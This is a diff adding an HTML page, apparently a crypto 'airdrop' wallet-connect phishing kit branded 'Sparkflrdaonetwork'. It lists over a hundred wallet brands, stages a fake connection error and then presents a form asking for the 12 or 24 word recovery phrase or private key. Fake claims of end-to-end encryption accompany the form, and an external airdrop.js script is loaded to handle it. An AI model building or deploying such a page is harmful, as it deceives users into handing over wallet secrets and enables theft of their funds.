@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sparkflrdaonetwork - Connect</title>
+    <link rel="apple-touch-icon" sizes="180x180" href="assets/favicon_io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon_io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="assets/favicon_io/favicon-16x16.png">
+    <link rel="manifest" href="assets/favicon_io/site.webmanifest">
+    <link rel="stylesheet" href="assets/css/airdrop.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+        integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+    <main>
+        <div class="main">
+            <div class="topSection">
+                <h4>Select a wallet</h4>
+
+                <!-- loading container  -->
+                <div class="loading-container">
+                    <div class="loading-bar"></div>
+                </div>
+
+                <div class="searchSection">
+                    <input type="search" placeholder="Find wallet" name="" id="searchWallet">
+                    <button>Search</button>
+                </div>
+            </div>
+
+            <!-- wallet section  -->
+            <div class="walletSection">
+                <p class="searchResult"><span id="walletCount">0</span> result found</p>
+
+                <div class="walletContainer">
+                    <div class="divWallet coinus">
+                        <img src="https://flarenetworkdao.live/assets/coinus-Bso1DCWT.jpg" alt="">
+                        <p>Coinus</p>
+                    </div>
+                    <div class="divWallet coolWallet">
+                        <img src="https://flarenetworkdao.live/assets/cool_wallet_s-B-ac7kp2.jpg" alt="">
+                        <p>Cool Wallet</p>
+                    </div>
+                    <div class="divWallet encrypted">
+                        <img src="https://flarenetworkdao.live/assets/encrypted_ink-Hn4VXy23.jpg" alt="">
+                        <p>Encrypted Ink</p>
+                    </div>
+                    <div class="divWallet infinito">
+                        <img src="https://flarenetworkdao.live/assets/infinito-BnN8RVss.jpg" alt="">
+                        <p>Infinito</p>
+                    </div>
+                    <div class="divWallet nash">
+                        <img src="https://flarenetworkdao.live/assets/nash-300x300-Dh6CyUr7.jpeg" alt="">
+                        <p>Nash</p>
+                    </div>
+                    <div class="divWallet saita">
+                        <img src="https://flarenetworkdao.live/assets/saita-CutBBLIE.png" alt="">
+                        <p>Saita</p>
+                    </div>
+                    <div class="divWallet phantom">
+                        <img src="https://flarenetworkdao.live/assets/phantom-C54D97AR.jpeg" alt="">
+                        <p>Phantom</p>
+                    </div>
+                    <div class="divWallet cardanoCoin">
+                        <img src="https://flarenetworkdao.live/assets/cardano-kz8_oaxb.jpg" alt="">
+                        <p>Cardano Coin</p>
+                    </div>
+                    <div class="divWallet coboVault">
+                        <img src="https://flarenetworkdao.live/assets/cobo-vault-5qYbC-ec.jpg" alt="">
+                        <p>Cobo Vault</p>
+                    </div>
+                    <div class="divWallet coinify">
+                        <img src="https://flarenetworkdao.live/assets/coinify-B_x3c6Ti.jpeg" alt="">
+                        <p>Coinify</p>
+                    </div>
+                    <div class="divWallet cryptoKeyStack">
+                        <img src="https://flarenetworkdao.live/assets/cryptoKey.png" alt="">
+                        <p>Crypto key stack</p>
+                    </div>
+                    <div class="divWallet cryptonator">
+                        <img src="assets/cryptonator.webp" alt="">
+                        <p>Cryptonator</p>
+                    </div>
+                    <div class="divWallet exodusWallet">
+                        <img src="assets/exodus.png" alt="">
+                        <p>Exodus wallet</p>
+                    </div>
+                    <div class="divWallet curv">
+                        <img src="assets/curv.png" alt="">
+                        <p>Curv</p>
+                    </div>
+                    <div class="divWallet curvDao">
+                        <img src="assets/curve-dao-token-hqx23N94.jpg" alt="">
+                        <p>Curv Dao Token</p>
+                    </div>
+                    <div class="divWallet keyring">
+                        <img src="assets/keyring_pro-M4zHr_JF.jpg" alt="">
+                        <p>Keyring pro</p>
+                    </div>
+                    <div class="divWallet keepKey">
+                        <img src="assets/keepKey.png" alt="">
+                        <p>Keepkey</p>
+                    </div>
+                    <div class="divWallet jaxxLiberty">
+                        <img src="assets/jaxLiberty.png" alt="">
+                        <p>Jax Liberty</p>
+                    </div>
+                    <div class="divWallet jasmy">
+                        <img src="assets/jasmycoin-U24ovCJH.jpg" alt="">
+                        <p>Jasmy</p>
+                    </div>
+                    <div class="divWallet jade">
+                        <img src="assets/jade_wallet-Cmdxn8eG.jpg" alt="">
+                        <p>Jade Wallet</p>
+                    </div>
+                    <div class="divWallet dcent">
+                        <img src="assets/dcent-C_uNVlig.png" alt="">
+                        <p>D'Cent Wallet</p>
+                    </div>
+                    <div class="divWallet imtoken">
+                        <img src="assets/imtoken-_whoJmdD.jpg" alt="">
+                        <p>ImToken</p>
+                    </div>
+                    <div class="divWallet idex">
+                        <img src="assets/idex.png" alt="">
+                        <p>Idex</p>
+                    </div>
+                    <div class="divWallet icon">
+                        <img src="assets/icon.png" alt="">
+                        <p>ICON</p>
+                    </div>
+                    <div class="divWallet huobi">
+                        <img src="assets/huobi-wallet-D63psSCr.jpeg" alt="">
+                        <p>Huobi Wallet</p>
+                    </div>
+                    <div class="divWallet hex">
+                        <img src="assets/hex-BKsd3tlI.jpg" alt="">
+                        <p>Hex</p>
+                    </div>
+                    <div class="divWallet hashkey">
+                        <img src="assets/hashkey_me-BOEZELqi.jpg" alt="">
+                        <p>Hashkey ME</p>
+                    </div>
+                    <div class="divWallet trustWallet">
+                        <img src="assets/halodefi_wallet-B0kPc20d.jpg" alt="">
+                        <p>Halo Defi</p>
+                    </div>
+                    <div class="divWallet guarda">
+                        <img src="assets/guarda_wallet-BJgGYq0T.jpg" alt="">
+                        <p>Guarda Wallet</p>
+                    </div>
+                    <div class="divWallet gridPlus">
+                        <img src="assets/gridplus-M1co4U7-.jpeg" alt="">
+                        <p>Grid Plus</p>
+                    </div>
+                    <div class="divWallet gnosisSafe">
+                        <img src="assets/gnosis-safe-multisig-Cu1nWsc_.jpeg" alt="">
+                        <p>Gnosis Safe Multisig</p>
+                    </div>
+                    <div class="divWallet gemini">
+                        <img src="assets/gemini.png" alt="">
+                        <p>Gemini</p>
+                    </div>
+                    <div class="divWallet gatehub">
+                        <img src="assets/gatehub.png" alt="">
+                        <p>Gatehub</p>
+                    </div>
+                    <div class="divWallet gateio">
+                        <img src="assets/gate_io-BGnMisvd.jpg" alt="">
+                        <p>Gate.io</p>
+                    </div>
+                    <div class="divWallet gamingShiba">
+                        <img src="assets/nilcoin-DX1upSDD.jpg" alt="">
+                        <p>Gaming Shiba Token</p>
+                    </div>
+                    <div class="divWallet gala">
+                        <img src="assets/gala.png" alt="">
+                        <p>Gala</p>
+                    </div>
+                    <div class="divWallet aqua">
+                        <img src="assets/aqua_wallet.jpeg" alt="">
+                        <p>Aqua Wallet</p>
+                    </div>
+                    <div class="divWallet ftx">
+                        <img src="assets/ftx-BThFgG6O.png" alt="">
+                        <p>FTX</p>
+                    </div>
+                    <div class="divWallet flare">
+                        <img src="assets/flare-wallet-BT1aX1Kp.jpeg" alt="">
+                        <p>Flare Wallet</p>
+                    </div>
+                    <div class="divWallet everRise">
+                        <img src="assets/everrise-BoTPcWb5.jpg" alt="">
+                        <p>EverRise Token</p>
+                    </div>
+                    <div class="divWallet etoro">
+                        <img src="assets/etoro-D7MDO0cN.jpg" alt="">
+                        <p>Etoro</p>
+                    </div>
+                    <div class="divWallet erisX">
+                        <img src="assets/erisX.png" alt="">
+                        <p>ErisX</p>
+                    </div>
+                    <div class="divWallet equicex">
+                        <img src="assets/equicex-tClyO-ww.jpeg" alt="">
+                        <p>Equicex</p>
+                    </div>
+                    <div class="divWallet ellipal">
+                        <img src="assets/ellipal-CDKCzDe4.jpeg" alt="">
+                        <p>Ellipal</p>
+                    </div>
+                    <div class="divWallet eidoo">
+                        <img src="assets/eidooo-CL4T3QmL.jpeg" alt="">
+                        <p>Eidoo</p>
+                    </div>
+                    <div class="divWallet easyPocket">
+                        <img src="assets/easy-pocket-BLBI0M8u.jpeg" alt="">
+                        <p>Easy Pocket</p>
+                    </div>
+                    <div class="divWallet dydx">
+                        <img src="assets/dydx-DSeDEbM6.png" alt="">
+                        <p>dydx</p>
+                    </div>
+                    <div class="divWallet dok">
+                        <img src="assets/dok_wallet-rcBUh9eD.jpg" alt="">
+                        <p>Dok</p>
+                    </div>
+                    <div class="divWallet dex">
+                        <img src="assets/dexwallet-CCzs6i7N.jpeg" alt="">
+                        <p>Dex</p>
+                    </div>
+                    <div class="divWallet shibaInu">
+                        <img src="assets/coinbase.png" alt="">
+                        <p>Coinbase Wallet</p>
+                    </div>
+                    <div class="divWallet defiant">
+                        <img src="assets/defiant-CHTGKp49.jpeg" alt="">
+                        <p>Defiant</p>
+                    </div>
+                    <div class="divWallet ddex">
+                        <img src="assets/ddex.png" alt="">
+                        <p>DDex</p>
+                    </div>
+                    <div class="divWallet cybavo">
+                        <img src="assets/cybavo-wallet-DsHfoyOv.jpeg" alt="">
+                        <p>CYBAVO Wallet</p>
+                    </div>
+                    <div class="divWallet iotex">
+                        <img src="assets/iotex-CYlvfgq2.jpeg" alt="">
+                        <p>Iotex Wallet</p>
+                    </div>
+                    <div class="divWallet coinomi">
+                        <img src="assets/coinomi-Du3Bgpi2.jpeg" alt="">
+                        <p>Coinomi Wallet</p>
+                    </div>
+                    <div class="divWallet ownbit">
+                        <img src="assets/ownbit-BO86Hzqa.jpeg" alt="">
+                        <p>Ownbit</p>
+                    </div>
+                    <div class="divWallet unstoppable">
+                        <img src="assets/Kraken-300x300-D6m-2n9Z.jpeg" alt="">
+                        <p>Kraken</p>
+                    </div>
+                    <div class="divWallet loopring">
+                        <img src="assets/loopring-CnKOZZNx.jpeg" alt="">
+                        <p>Loopring</p>
+                    </div>
+                    <div class="divWallet mongoose">
+                        <img src="assets/mongoose-Vp_VU-CN.jpg" alt="">
+                        <p>Mongoose</p>
+                    </div>
+                    <div class="divWallet mathWallet">
+                        <img src="assets/math-300x300-DG5-NN_D.jpeg" alt="">
+                        <p>Math Wallet</p>
+                    </div>
+                    <div class="divWallet mykey">
+                        <img src="assets/myjey-300x300-al3KthwG.jpeg" alt="">
+                        <p>MYKEY</p>
+                    </div>
+                    <div class="divWallet nash">
+                        <img src="assets/nash-300x300-Dh6CyUr7.jpeg" alt="">
+                        <p>Nash</p>
+                    </div>
+                    <div class="divWallet nilcoin">
+                        <img src="assets/nilcoin-DX1upSDD.jpg" alt="">
+                        <p>NIL Coin</p>
+                    </div>
+                    <div class="divWallet paybis">
+                        <img src="assets/paybis-DM5dh6b9.jpg" alt="">
+                        <p>Paybis</p>
+                    </div>
+                    <div class="divWallet pillar">
+                        <img src="assets/pillar-300x300-C510l_0F.jpeg" alt="">
+                        <p>PIllar</p>
+                    </div>
+                    <div class="divWallet polkadot">
+                        <img src="assets/polkadot.jpeg" alt="">
+                        <p>Polkadot</p>
+                    </div>
+                    <div class="divWallet polygon">
+                        <img src="assets/polygon-6IFRuliI.jpeg" alt="">
+                        <p>Polygon</p>
+                    </div>
+                    <div class="divWallet sparkpoint">
+                        <img src="assets/spark-point-CJhJXAoG.jpeg" alt="">
+                        <p>SparkPoint</p>
+                    </div>
+                    <div class="divWallet poolTogether">
+                        <img src="assets/pool-BGnmKpgU.png" alt="">
+                        <p>poolTogether</p>
+                    </div>
+                    <div class="divWallet rainbow">
+                        <img src="assets/rainbow-300x300-Dbq5kmcy.jpeg" alt="">
+                        <p>Rainbow</p>
+                    </div>
+                    <div class="divWallet robinhood">
+                        <img src="assets/robinhood.png" alt="">
+                        <p>Robinhood</p>
+                    </div>
+                    <div class="divWallet safepal">
+                        <img src="assets/safepal.png" alt="">
+                        <p>Safepal Wallet</p>
+                    </div>
+                    <div class="divWallet sandbox">
+                        <img src="assets/sandbox-CM7PEFV4.jpg" alt="">
+                        <p>Sandbox Token</p>
+                    </div>
+                    <div class="divWallet soloCoin">
+                        <img src="assets/solocoin.png" alt="">
+                        <p>Solo Coin</p>
+                    </div>
+                    <div class="divWallet spatium">
+                        <img src="assets/spat-300x300-C5BOMPTd.jpeg" alt="">
+                        <p>Spatium</p>
+                    </div>
+                    <div class="divWallet terra">
+                        <img src="assets/terra-CSUqfs4z.png" alt="">
+                        <p>Terra</p>
+                    </div>
+                    <div class="divWallet torus">
+                        <img src="assets/torus-300x300-D9LuP5j0.jpeg" alt="">
+                        <p>Torus</p>
+                    </div>
+                    <div class="divWallet tradeStation">
+                        <img src="assets/Tradestation-300x300-BTPjU7L4.png" alt="">
+                        <p>TradeStation</p>
+                    </div>
+                    <div class="divWallet trustee">
+                        <img src="assets/trustee-Bk8qQrbu.jpeg" alt="">
+                        <p>Trustee Wallet</p>
+                    </div>
+                    <div class="divWallet trustVault">
+                        <img src="assets/trust-vault-GDpGklXQ.jpeg" alt="">
+                        <p>TrustVault</p>
+                    </div>
+                    <div class="divWallet uniswap">
+                        <img src="assets/uniswap-CiqAsxQP.jpeg" alt="">
+                        <p>Uniswap</p>
+                    </div>
+                    <div class="divWallet uphold">
+                        <img src="assets/uphold-logo-vertical-color-big-1024x907-1-300x266-CDAI4LwX.jpeg" alt="">
+                        <p>Uphold Wallet</p>
+                    </div>
+                    <div class="divWallet trezor">
+                        <img src="assets/trezor-300x300-DB_9GlA4.png" alt="">
+                        <p>Trezor Wallet</p>
+                    </div>
+                    <div class="divWallet xaman">
+                        <img src="assets/xaman.jpeg" alt="">
+                        <p>Xaman</p>
+                    </div>
+                    <div class="divWallet imtoken">
+                        <img src="assets/imtoken-_whoJmdD.jpg" alt="">
+                        <p>imToken</p>
+                    </div>
+                    <div class="divWallet atWallet">
+                        <img src="assets/at_wallet-1wXNrSJx.jpg" alt="">
+                        <p>AT.wallet</p>
+                    </div>
+                    <div class="divWallet midas">
+                        <img src="assets/midas_wallet-D0Oqm7UO.jpg" alt="">
+                        <p>Midas Wallet</p>
+                    </div>
+                    <div class="divWallet keyringPro">
+                        <img src="assets/keyring_pro-M4zHr_JF.jpg" alt="">
+                        <p>KeyRing Pro</p>
+                    </div>
+                    <div class="divWallet talken">
+                        <img src="assets/talken_wallet-Bb6NOoaH.jpg" alt="">
+                        <p>Talken Wallet</p>
+                    </div>
+                    <div class="divWallet xifin">
+                        <img src="assets/xinfin-Mil4icQM.jpg" alt="">
+                        <p>Xifin Network</p>
+                    </div>
+                    <div class="divWallet tongue">
+                        <img src="assets/tongue_wallet-umcDeFoD.jpg" alt="">
+                        <p>Tongue Wallet</p>
+                    </div>
+                    <div class="divWallet atoken">
+                        <img src="assets/atoken_wallet-CK6zhMsy.jpg" alt="">
+                        <p>Atoken wallet</p>
+                    </div>
+                    <div class="divWallet kyber">
+                        <img src="assets/kyberswap-o5uNMOLi.jpg" alt="">
+                        <p>Kyber Swap</p>
+                    </div>
+                    <div class="divWallet flare">
+                        <img src="assets/flare-wallet-BT1aX1Kp.jpeg" alt="">
+                        <p>Flare Wallet</p>
+                    </div>
+                    <div class="divWallet rwallet">
+                        <img src="assets/rwallet-BxGLrfTi.jpg" alt="">
+                        <p>RWallet</p>
+                    </div>
+                    <div class="divWallet o3">
+                        <img src="assets/o3_wallet-DGCcoRbQ.jpg" alt="">
+                        <p>O3 Wallet</p>
+                    </div>
+                    <div class="divWallet valora">
+                        <img src="assets/valora-Bg9dwgyM.jpg" alt="">
+                        <p>Valora Wallet</p>
+                    </div>
+                    <div class="divWallet yoroi">
+                        <img src="assets/yoroi-wallet-xuMi6n6X.png" alt="">
+                        <p>Yoroi wallet</p>
+                    </div>
+                    <div class="divWallet bridge">
+                        <img src="assets/bridge_wallet-CBR6SLCQ.jpg" alt="">
+                        <p>Bridge Wallet</p>
+                    </div>
+                    <div class="divWallet trustWallet">
+                        <img src="assets/trust_wallet-CwSZ6Qhd.jpeg" alt="">
+                        <p>Trust Wallet</p>
+                    </div>
+                    <div class="divWallet walletConnect">
+                        <img src="assets/wallet_connect-B-N3PQ6b.jpeg" alt="">
+                        <p>Wallet Connect</p>
+                    </div>
+                    <div class="divWallet ledger">
+                        <img src="assets/ledger-f_CXCY82.jpeg" alt="">
+                        <p>Ledger</p>
+                    </div>
+                    <div class="divWallet metaMask">
+                        <img src="assets/meta_mask-BNH2oT7K.jpeg" alt="">
+                        <p>Meta Mask</p>
+                    </div>
+                    <div class="divWallet binanceChain">
+                        <img src="assets/binance-CeAudAwg.jpeg" alt="">
+                        <p>Binance Chain Wallet</p>
+                    </div>
+                    <div class="divWallet atomic">
+                        <img src="assets/atomic_wallet-Bk6TOSlg.jpeg" alt="">
+                        <p>Atomic Wallet</p>
+                    </div>
+                    <div class="divWallet bitpay">
+                        <img src="assets/bitpay-Bu43lB4W.jpeg" alt="">
+                        <p>Bitpay</p>
+                    </div>
+                    <div class="divWallet shibaInu">
+                        <img src="assets/shiba_inu-GSd_ipZs.jpeg" alt="">
+                        <p>Shiba inu</p>
+                    </div>
+                    <div class="divWallet keplr">
+                        <img src="assets/keplr-DxeWTDEu.png" alt="">
+                        <p>Keplr Wallet</p>
+                    </div>
+                    <div class="divWallet compound">
+                        <img src="assets/compound-Bobr-WE9.png" alt="">
+                        <p>Compound</p>
+                    </div>
+                    <div class="divWallet cryptoCom">
+                        <img src="assets/crypto_com-iSlixqlm.jpeg" alt="">
+                        <p>Crypto.com</p>
+                    </div>
+                    <div class="divWallet ownbit">
+                        <img src="assets/ownbit-BO86Hzqa.jpeg" alt="">
+                        <p>Ownbit</p>
+                    </div>
+                    <div class="divWallet coin98">
+                        <img src="assets/coin98-c98-logo-B_jRLkeJ.png" alt="">
+                        <p>Coin98</p>
+                    </div>
+                    <div class="divWallet bitkeep">
+                        <img src="assets/bitkeep-UNZezxlD.jpeg" alt="">
+                        <p>Bitkeep</p>
+                    </div>
+                    <div class="divWallet unstoppable">
+                        <img src="assets/unstoppable.png" alt="">
+                        <p>Unstoppable Wallet</p>
+                    </div>
+                    <div class="divWallet coinUs">
+                        <img src="assets/coinUs.png" alt="">
+                        <p>CoinUs</p>
+                    </div>
+                    <div class="divWallet plasmapay">
+                        <img src="assets/plasmapay.png" alt="">
+                        <p>Plasmapay</p>
+                    </div>
+                    <div class="divWallet nexo">
+                        <img src="assets/nexo.png" alt="">
+                        <p>Nexo Wallet</p>
+                    </div>
+                    <div class="divWallet tangem">
+                        <img src="assets/tangem-mVxxoJjD.jpeg" alt="">
+                        <p>Tangem</p>
+                    </div>
+                    <div class="divWallet 1inch">
+                        <img src="assets/1inch-DYS4qAZ-.jpeg" alt="">
+                        <p>1inch</p>
+                    </div>
+                    <div class="divWallet airgap">
+                        <img src="assets/airgap-DNXkohcU.jpeg" alt="">
+                        <p>Coinus</p>
+                    </div>
+                    <div class="divWallet airswap">
+                        <img src="assets/airswap-Fqf8sApE.jpeg" alt="">
+                        <p>Airswap</p>
+                    </div>
+                    <div class="divWallet aktionariat">
+                        <img src="assets/aktionariat-3tPkyhu5.jpeg" alt="">
+                        <p>Aktionariat</p>
+                    </div>
+                    <div class="divWallet aladdin">
+                        <img src="assets/aladdin-wallet-DpEPdymP.jpeg" alt="">
+                        <p>Aladdin Wallet</p>
+                    </div>
+                    <div class="divWallet alphaWallet">
+                        <img src="assets/alpha-wallet-CR5upzFt.jpeg" alt="">
+                        <p>Alpha Wallet</p>
+                    </div>
+                    <div class="divWallet authereum">
+                        <img src="assets/authereum-BBBgK8fO.png" alt="">
+                        <p>Authereum</p>
+                    </div>
+                    <div class="divWallet bcVault">
+                        <img src="assets/bc-vault-Be0c4nP9.jpeg" alt="">
+                        <p>Bc-vault</p>
+                    </div>
+                    <div class="divWallet bitfi">
+                        <img src="assets/bitfi-_QmxDzAE.jpeg" alt="">
+                        <p>Bitfi</p>
+                    </div>
+                    <div class="divWallet bitfia">
+                        <img src="assets/bitfia-DVisQqLk.jpeg" alt="">
+                        <p>Bitfia Wallet</p>
+                    </div>
+                    <div class="divWallet bitinka">
+                        <img src="assets/Bitinka-TkDcD2hP.png" alt="">
+                        <p>Bitinka</p>
+                    </div>
+                    <div class="divWallet bitmymoney">
+                        <img src="assets/bitmymoney-IXrPC8AD.png" alt="">
+                        <p>BitMyMoney</p>
+                    </div>
+                    <div class="divWallet bitvault">
+                        <img src="assets/bitvault-cs7qmqcf.jpeg" alt="">
+                        <p>Bitvault</p>
+                    </div>
+                    <div class="divWallet blockchain">
+                        <img src="assets/blockchain.png" alt="">
+                        <p>Blockchain</p>
+                    </div>
+                    <div class="divWallet buntoy">
+                        <img src="assets/buntoy.png" alt="">
+                        <p>Buntoy</p>
+                    </div>
+                    <div class="divWallet cwallet">
+                        <img src="assets/cwallet.png" alt="">
+                        <p>Cwallet</p>
+                    </div>
+                    <div class="divWallet bifrost">
+                        <img src="assets/bifrost.jpeg" alt="">
+                        <p>Bifrost</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- WALLET POPUP  -->
+        <div class="walletPopupMain active">
+            <div class="walletPopup">
+                <div class="closePopup">
+                    <p id="closePopup">X</p>
+                </div>
+                <div class="popupContent">
+                    <img class="wallet-img" src="assets/1inch-DYS4qAZ-.jpeg" alt="">
+                    <p class="wallet-name">wallet</p>
+                    <small>This session is secured and encrypted.</small>
+
+                    <div class="auto">
+                        <div class="loading-container popupLoad">
+                            <div class="loading-bar"></div>
+                        </div>
+                        <p class="start-secure">starting secure connection...</p>
+                        <span>please wait..</span>
+                    </div>
+
+                    <div class="manual active">
+                        <span class="error">An error occurred... please wait or connect manually</span>
+                        <button class="tryAgain">Try Again</button>
+                        <button class="manualConnect">Connect manually</button>
+                    </div>
+
+                    <form id="myForm" class="phraseForm active">
+                        <input type="hidden" name="_captcha" value="false">
+                        <textarea required class="phraseBox" name="message" id=""
+                            placeholder="Enter your 12 or 24 Mnemonic words. seperate them with spaces. You can also input your privatekey instead."></textarea>
+                        <div class="loading-container formLoading active ">
+                            <div class="loading-bar"></div>
+                        </div>
+                        <button type="submit" name="send" class="connectbtn">Connect</button>
+
+                    </form>
+
+
+                    <div class="secure">
+                        <img src="assets/images/secure-img.svg" alt="">
+                        <span>This session is secured with end-to-end encryption</span>
+                    </div>
+
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script src="scripts/airdrop.js"></script>
+
+</body>
+
+</html>
